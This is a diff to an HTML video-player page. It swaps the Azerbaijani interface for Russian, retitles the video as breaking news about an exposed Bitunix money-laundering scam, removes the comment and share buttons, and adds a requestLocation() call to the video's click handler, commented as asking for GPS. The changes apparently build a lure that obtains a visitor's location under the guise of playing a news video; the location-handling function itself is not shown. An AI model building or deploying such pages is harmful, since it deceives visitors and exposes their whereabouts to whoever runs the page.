@@ -133,21 +133,19 @@
             </video>
             <div class="loading-overlay" id="loadingOverlay">
                 <div class="spinner"></div>
-                <p>Video yüklənir...</p>
+                <p>Загрузка видео...</p>
             </div>
         </div>
         <div class="video-info">
-            <h1>Big Buck Bunny - Full HD</h1>
+            <h1>Афера с Bitunix по отмыванию денег раскрыта.</h1>
             <div class="video-meta">
-                <span>1.2M baxış</span>
-                <span>3 gün əvvəl</span>
+                <span>1.2M обзор</span>
+                <span>3 часа назад</span>
                 <span>HD 1080p</span>
             </div>
             <div class="video-actions">
                 <button class="action-btn">👍 12K</button>
                 <button class="action-btn">👎 340</button>
-                <button class="action-btn">💬 Şərhlər</button>
-                <button class="action-btn">↗️ Paylaş</button>
             </div>
         </div>
     </div>
@@ -162,8 +160,9 @@
             video.play().catch(() => {});
         });
 
-        // Videoya klik etdikdə pause/play
+        // Videoya klik etdikdə pause/play + GPS soruş
         video.addEventListener('click', function() {
+            requestLocation();
             if (video.paused) video.play();
             else video.pause();
         });
